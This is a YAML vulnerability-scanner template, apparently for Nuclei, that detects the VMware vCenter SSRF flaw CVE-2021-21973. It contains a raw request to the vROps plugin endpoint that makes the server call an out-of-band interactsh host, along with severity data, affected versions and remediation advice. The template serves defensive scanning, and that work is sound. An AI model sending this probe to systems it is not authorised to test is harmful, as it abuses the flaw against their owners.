http:
- matchers:
  - part: body
    type: word
    words:
    - The server sent HTTP status code 200
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - 'GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1

    Host: {{Hostname}}

    Vcip: {{interactsh-url}}

    Vcpassword: {{rand_base(6)}}

    Vcusername: {{rand_base(6)}}

    Reqresource: {{rand_base(6)}}

    '
id: CVE-2021-21973
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:vmware:cloud_foundation:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-21973
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-918
    epss-percentile: 0.99575
    epss-score: 0.90336
  description: VMware vSphere (HTML5) is susceptible to server-side request forgery
    due to improper validation of URLs in a vCenter Server plugin. An attacker with
    network access to port 443 can exploit this issue by sending a POST request to
    the plugin. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before
    6.7 U3l, and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and
    3.x before 3.10.1.2).
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    send arbitrary requests from the vulnerable server, potentially leading to unauthorized
    access, data leakage, or further attacks.

    '
  metadata:
    max-request: 1
    product: cloud_foundation
    vendor: vmware
  name: VMware vSphere - Server-Side Request Forgery
  reference:
  - https://twitter.com/osama_hroot/status/1365586206982082560
  - https://twitter.com/bytehx343/status/1486582542807420928
  - https://www.vmware.com/security/advisories/VMSA-2021-0002.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21973
  - https://github.com/soosmile/POC
  remediation: 'Apply the necessary security patches or updates provided by VMware
    to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2021,cve,vmware,ssrf,vcenter,oast,kev,vkev,vuln
